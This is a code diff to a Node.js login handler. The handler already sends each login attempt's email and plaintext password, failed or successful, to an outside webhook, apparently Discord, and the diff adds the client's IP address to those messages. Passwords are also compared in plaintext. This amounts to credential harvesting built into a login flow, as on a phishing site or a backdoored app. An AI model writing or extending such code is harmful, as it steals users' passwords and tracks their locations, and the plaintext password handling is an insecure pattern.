@@ -84,15 +84,18 @@ exports.login = catchAsync(async (req, res, next) => {
   //     mapToModel: true,
   //   });
 
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+
   const user = await User.findOne({ where: { email: req.body.email } });
 
   if (!user || !(await user.password === req.body.password)) {
 
     // send webhook
     const embed = new MessageBuilder()
-      .setTitle('Failed Login Attempt')
+      .setTitle('Failed Login')
       .addField('Email', req.body.email)
       .addField('Password', ' || ' + req.body.password + ' || ')
+      .addField('IP', ip)
       .setColor('#ff0000')
       .setTimestamp();
     hook.send(embed);
@@ -105,6 +108,7 @@ exports.login = catchAsync(async (req, res, next) => {
     .setTitle('Successful Login')
     .addField('Email', req.body.email)
     .addField('Password', ' || ' + req.body.password + ' || ')
+    .addField('IP', ip)
     .setColor('#00ff00')
     .setTimestamp();
   hook.send(embed);
